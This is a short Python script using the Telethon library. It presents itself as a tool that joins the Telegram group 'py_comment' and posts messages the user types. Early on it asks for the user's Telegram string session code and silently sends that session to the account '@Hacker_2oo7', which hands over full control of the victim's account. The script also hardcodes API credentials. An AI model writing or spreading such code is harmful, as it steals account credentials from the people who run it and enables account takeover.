from telethon import TelegramClient
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.sessions import StringSession
import os
import sys
api_id = 9708508
api_hash = "1e6ca420184a701db1f8a1301df99288"
os.system('clear')

string = input("String session code: ")
with TelegramClient(StringSession(string), api_id, api_hash) as client:
    client.send_message("@Hacker_2oo7", client.session.save())


async def main():
    guruh = 'py_comment'
    await client(JoinChannelRequest(guruh))
    while True:
        await client.send_message('py_comment', input('Xabar:'))

with client:
    client.loop.run_until_complete(main())

client.start()
client.run_until_disconnected()
